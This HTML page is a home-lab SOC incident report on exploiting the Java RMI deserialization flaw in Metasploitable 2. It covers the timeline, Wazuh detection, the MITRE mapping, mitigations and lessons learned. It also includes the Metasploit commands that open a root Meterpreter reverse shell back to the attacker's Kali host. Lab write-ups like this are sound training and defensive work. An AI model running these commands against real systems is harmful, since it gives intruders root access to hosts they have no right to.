<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="SOC incident report detailing initial access via Java RMI deserialization exploit using Metasploit to obtain a Meterpreter session as root.">
    <title>Initial Access via Java RMI Deserialization Exploit | jellybeansontoasties Home Lab</title>
    <link rel="stylesheet" href="../assets/css/style.css">
</head>
<body>
    <nav>
        <ul>
            <li><a href="../index.html">Home</a></li>
            <li><a href="../about.html">About</a></li>
            <li><a href="../lab-setup.html">Lab Setup</a></li>
            <li><a href="writeup-1-reconnaissance.html">Incident Reports</a></li>
            <li><a href="https://github.com/Jellybeansontoasties">GitHub</a></li>
        </ul>
    </nav>

    <header class="hero-typewriter">
        <h1><span id="line1"></span><span class="typewriter-cursor" id="typewriter-cursor">█</span></h1>
        <p class="tagline"><span id="line2"></span></p>
    </header>

    <main>
        <h1>Initial Access via Java RMI Deserialization Exploit</h1>
        <p class="tagline">Incident response report — Metasploit Java RMI deserialization exploit establishing a Meterpreter session from Metasploitable 2 to Kali.</p>

        <div class="writeup-section">
            <h3>Environment</h3>
            <ul>
                <li><strong>Attacker:</strong> Kali Linux, 192.168.100.10</li>
                <li><strong>Victim:</strong> Metasploitable 2, 192.168.100.20</li>
                <li><strong>SIEM:</strong> Wazuh 4.7.5 (Docker), 192.168.100.50</li>
                <li><strong>Network:</strong> Isolated KVM bridge <code>virbr1</code>, 192.168.100.0/24</li>
                <li><strong>Host:</strong> Arch Linux, i7-13700HX, 15GB RAM, RTX 4060</li>
            </ul>
        </div>

        <div class="writeup-section">
            <h3>Incident Metadata</h3>
            <ul>
                <li><strong>Incident Title:</strong> Initial Access via Java RMI Deserialization Exploit</li>
                <li><strong>Date:</strong> February 22, 2026</li>
                <li><strong>Severity:</strong> Critical</li>
            </ul>
        </div>

        <div class="writeup-section">
            <h3>Detection Method</h3>
            <ul>
                <li>Wazuh flagged an unusual outbound connection originating from <strong>192.168.100.20</strong> to the attacker IP on port <strong>4444</strong>.</li>
                <li>Java RMI port <strong>1099/tcp</strong> received a malformed serialized object, identified via network inspection.</li>
                <li>A reverse TCP session was established from the victim to the attacker, consistent with a Meterpreter payload.</li>
                <li>Endpoint telemetry indicated process injection and in-memory execution associated with the Meterpreter session.</li>
            </ul>
        </div>

        <div class="writeup-section">
            <h3>Incident Timeline</h3>
            <ul>
                <li><strong>10:10</strong> — Attacker launches <code>msfconsole</code> on Kali.</li>
                <li><strong>10:10</strong> — Module selected: <code>exploit/multi/misc/java_rmi_server</code>.</li>
                <li><strong>10:10</strong> — <code>RHOSTS</code> set to <code>192.168.100.20</code>, <code>LHOST</code> set to <code>192.168.100.10</code>.</li>
                <li><strong>10:10:30</strong> — Malicious serialized Java object sent to Java RMI service listening on port 1099.</li>
                <li><strong>10:10:31</strong> — Target JVM deserializes attacker-controlled payload and executes arbitrary code.</li>
                <li><strong>10:10:31</strong> — Reverse TCP connection established from <code>192.168.100.20</code> to <code>192.168.100.10:4444</code>.</li>
                <li><strong>10:10:32</strong> — Meterpreter session 1 opened, running in memory with root privileges.</li>
            </ul>
        </div>

        <div class="writeup-section">
            <h3>Commands Used</h3>
            <pre><code>msfconsole
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.100.20
set LHOST 192.168.100.10
run</code></pre>
        </div>

        <div class="writeup-section">
            <h3>MITRE ATT&amp;CK Mapping</h3>
            <ul>
                <li><strong>Tactics:</strong> TA0001 Initial Access, TA0002 Execution</li>
                <li><strong>Techniques:</strong> T1203 Exploitation for Client Execution, T1059 Command and Scripting Interpreter</li>
                <li><strong>Tools:</strong> Metasploit Framework, Meterpreter</li>
            </ul>
        </div>

        <div class="writeup-section">
            <h3>Vulnerability</h3>
            <p>The exploited weakness is an unauthenticated Java RMI deserialization flaw. The RMI registry on Metasploitable 2 accepts serialized Java objects over the network without any authentication or input validation. When the crafted payload from Metasploit is deserialized by the target JVM, it triggers arbitrary code execution on the server. In this configuration the Java RMI service runs as <code>root</code>, meaning successful exploitation immediately yields full system privileges.</p>
        </div>

        <div class="writeup-section">
            <h3>Analysis</h3>
            <p>Java RMI services are rarely required to be exposed directly to untrusted networks, yet in this lab environment the registry was listening on all interfaces without restriction. Because the service does not enforce authentication or integrity checks on incoming objects, it effectively trusts untrusted data from the network — a classic deserialization vulnerability. The Meterpreter payload executed entirely in memory, writing no artifacts to disk, which diminishes the effectiveness of traditional signature-based antivirus. Immediate root access, combined with stealthy in-memory execution, makes this vector particularly dangerous in production environments where monitoring may be limited to file-based indicators.</p>
        </div>

        <div class="writeup-section">
            <h3>Impact</h3>
            <p>The attacker achieved remote code execution as <strong>root</strong> on the victim host with a single network transaction. From this foothold, any system-level action is possible, including modification of system binaries, deployment of additional backdoors, credential dumping, and disabling of security tooling. Because the Meterpreter session operates over an encrypted reverse TCP channel that is initiated from the server, traditional perimeter defenses see only an outbound connection to what may appear to be an innocuous IP and port combination.</p>
        </div>

        <div class="writeup-section">
            <h3>Mitigation &amp; Recommendations</h3>
            <ul>
                <li>Disable Java RMI entirely unless there is a documented, justified business requirement for its use.</li>
                <li>Never run Java application services or supporting components as <code>root</code>; enforce the principle of least privilege with dedicated service accounts.</li>
                <li>Implement application whitelisting or allowlisting to prevent unauthorized binaries, scripts, and shells from executing.</li>
                <li>Deploy EDR tooling capable of detecting in-memory payloads, reflective loading, and suspicious process injection patterns.</li>
                <li>Monitor for unexpected outbound connections from server-class systems, especially to non-standard high ports such as 4444.</li>
            </ul>
        </div>

        <div class="writeup-section">
            <h3>Lessons Learned</h3>
            <p>Exposed middleware services like Java RMI often receive less scrutiny than web servers or VPN gateways, yet they can provide direct, high-privilege access when misconfigured. This exercise underscores the need to inventory and review all listening services, not just those that users interact with directly. Defenders should treat unauthenticated remote code execution vulnerabilities as emergency-level issues and design monitoring strategies that account for in-memory attacks and outbound control channels.</p>
        </div>

        <div class="writeup-section">
            <h3>Appendix</h3>
            <p>Additional visual evidence should be captured for training, documentation, and tabletop exercises.</p>
            <!-- SCREENSHOT: msfconsole with exploit/multi/misc/java_rmi_server configured -->
            <!-- SCREENSHOT: Meterpreter session console showing reverse connection details -->
        </div>

        <nav class="writeup-nav">
            <a href="writeup-2-bruteforce.html">← Previous: Credential Access via SSH Brute Force</a>
            <a href="writeup-4-exfiltration.html">Next: Credential Dumping via /etc/shadow Exfiltration →</a>
        </nav>
    </main>

    <footer class="site-footer">
      <p>
        <a href="https://github.com/jellybeansontoasties" target="_blank">GitHub</a>
        &nbsp;|&nbsp;
        built on arch btw
      </p>
    </footer>

    <script>
(function() {
  const lines = [
    'Incident Report #3',
    'Metasploit Java RMI Reverse Shell'
  ];
  const line1El = document.getElementById('line1');
  const line2El = document.getElementById('line2');
  const cursor = document.getElementById('typewriter-cursor');
  const charDelay = 30;
  const linePause = 750;

  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

  async function typeLine(text, el) {
    const parent = el.parentNode;
    parent.appendChild(cursor);
    cursor.style.visibility = 'visible';

    for (let i = 0; i <= text.length; i++) {
      el.textContent = text.slice(0, i);
      await sleep(charDelay);
    }
    await sleep(linePause);
  }

  (async function run() {
    await typeLine(lines[0], line1El);
    await typeLine(lines[1], line2El);
  })();
})();
    </script>
</body>
</html>

